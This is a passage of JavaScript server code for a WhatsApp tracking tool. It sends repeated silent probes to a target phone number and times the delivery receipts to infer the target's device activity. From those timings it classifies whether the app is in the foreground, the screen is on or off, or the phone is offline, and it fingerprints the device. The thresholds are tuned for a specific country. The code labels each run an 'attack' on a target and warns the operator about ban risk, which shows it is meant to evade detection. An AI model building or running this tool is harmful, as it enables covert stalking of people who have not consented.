    characteristics['Min RTT'] = `${minRtt.toFixed(0)}ms`;
    characteristics['Max RTT'] = `${maxRtt.toFixed(0)}ms`;
    characteristics['RTT Std Dev'] = `${stdDev.toFixed(0)}ms`;
    characteristics['Foreground %'] = `${((statusCounts.APP_FOREGROUND || 0) / validRtts.length * 100).toFixed(1)}%`;
    characteristics['Screen On %'] = `${((statusCounts.SCREEN_ON || 0) / validRtts.length * 100).toFixed(1)}%`;
    characteristics['Screen Off %'] = `${((statusCounts.SCREEN_OFF || 0) / validRtts.length * 100).toFixed(1)}%`;
    characteristics['Transitions'] = transitions.length;
    
    deviceProfile = {
        detectedBrand: brand,
        detectedModel: monitoringConfig.deviceModel || 'Not specified',
        confidence: confidence,
        characteristics: characteristics,
        screenTransitions: transitions
    };
    
    return deviceProfile;
}

function handleReceipt(messageId, status) {
    if (!pendingProbes.has(messageId)) return;
    
    const probe = pendingProbes.get(messageId);
    const endTime = Date.now();
    const rtt = endTime - probe.startTime;
    
    // Adjusted thresholds for Jordan network conditions
    // Jordan -> WhatsApp servers: +200-400ms baseline latency
    // Original: <600ms foreground, <1300ms screen on, <3500ms screen off
    // Jordan adjusted: +300ms average network overhead
    let userStatus;
    if (rtt < 900) userStatus = 'APP_FOREGROUND';          // 600 + 300ms
    else if (rtt < 1600) userStatus = 'SCREEN_ON';         // 1300 + 300ms  
    else if (rtt < 3800) userStatus = 'SCREEN_OFF';        // 3500 + 300ms
    else userStatus = 'UNKNOWN';
    
    const measurement = {
        timestamp: new Date().toISOString(),
        target: probe.target,
        deviceModel: probe.deviceModel,
        rtt_ms: rtt,
        status: userStatus,
        receipt_type: status
    };
    
    measurements.push(measurement);
    io.emit('measurement', measurement);
    
    // Analyze device fingerprint every 5 measurements
    if (measurements.length % 5 === 0) {
        const profile = analyzeDeviceFingerprint();
        io.emit('device-profile', profile);
    }
    
    pendingProbes.delete(messageId);
}

function handleTimeout(messageId) {
    if (!pendingProbes.has(messageId)) return;
    
    const probe = pendingProbes.get(messageId);
    const measurement = {
        timestamp: new Date().toISOString(),
        target: probe.target,
        deviceModel: probe.deviceModel,
        rtt_ms: null,
        status: 'OFFLINE'
    };
    
    measurements.push(measurement);
    io.emit('measurement', measurement);
    
    pendingProbes.delete(messageId);
}

// Socket.io handlers
io.on('connection', (socket) => {
    console.log('Client connected');
    
    socket.on('get-status', () => {
        if (whatsappSock?.user) {
            socket.emit('connected', {
                id: whatsappSock.user.id,
                name: whatsappSock.user.name
            });
        }
    });
    
    socket.on('start-monitoring', async (config) => {
        monitoringConfig = config;
        isMonitoring = true;
        measurements = [];
        
        // Warning for aggressive intervals
        if (config.interval < 5) {
            io.emit('log', `⚠️ WARNING: ${config.interval}s interval is VERY AGGRESSIVE - High ban risk!`);
            io.emit('log', '⚠️ WhatsApp may detect and ban your account. Recommended: 15-30s');
        } else if (config.interval < 10) {
            io.emit('log', `⚠️ Caution: ${config.interval}s interval may trigger detection. Recommended: 15-30s`);
        }
        
        io.emit('log', `> INITIATING ATTACK: TARGET [${config.targetNumber}]`);
        
        // Send initial probe
        await sendSilentProbe(config.targetNumber);
        
        // Set up interval
        const intervalId = setInterval(async () => {
            if (!isMonitoring) {
                clearInterval(intervalId);
                return;
            }
            await sendSilentProbe(config.targetNumber);
        }, config.interval * 1000);
        
        // Auto-stop after duration
        setTimeout(() => {
            isMonitoring = false;
            clearInterval(intervalId);
            io.emit('log', 'Monitoring completed');
            exportResults();
        }, config.duration * 60 * 1000);
    });
    
    socket.on('stop-monitoring', () => {
        isMonitoring = false;
        io.emit('log', 'Monitoring stopped by user');
        exportResults();
    });
    
    socket.on('get-stats', () => {
        const validRtts = measurements.filter(m => m.rtt_ms !== null);
        const stats = {
            total: measurements.length,
            avgRtt: validRtts.length > 0 ? Math.round(validRtts.reduce((sum, m) => sum + m.rtt_ms, 0) / validRtts.length) : null,
            minRtt: validRtts.length > 0 ? Math.min(...validRtts.map(m => m.rtt_ms)) : null,
            maxRtt: validRtts.length > 0 ? Math.max(...validRtts.map(m => m.rtt_ms)) : null,
            statusCounts: measurements.reduce((acc, m) => {
                acc[m.status] = (acc[m.status] || 0) + 1;
                return acc;
            }, {})
        };
        socket.emit('stats', stats);
    });
    
    socket.on('clear-results', () => {
        measurements = [];
        pendingProbes.clear();
        deviceProfile = {
            detectedBrand: 'Unknown',
            detectedModel: 'Unknown',
            confidence: 0,
            characteristics: {},
            screenTransitions: []
        };
        io.emit('log', 'All results cleared');
    });
});

function exportResults() {
    const filename = `rtt_measurements_${new Date().toISOString().replace(/:/g, '-')}.json`;
    fs.writeFileSync(filename, JSON.stringify({ 
        config: monitoringConfig,
        measurements 
    }, null, 2));
    io.emit('log', `Results exported to: ${filename}`);
}

// Start server
const PORT = 3000;
server.listen(PORT, async () => {
    console.log(`\n🌐 Web Interface running at: http://localhost:${PORT}`);
    console.log('\n📱 Connecting to WhatsApp...\n');
    await connectToWhatsApp();
});
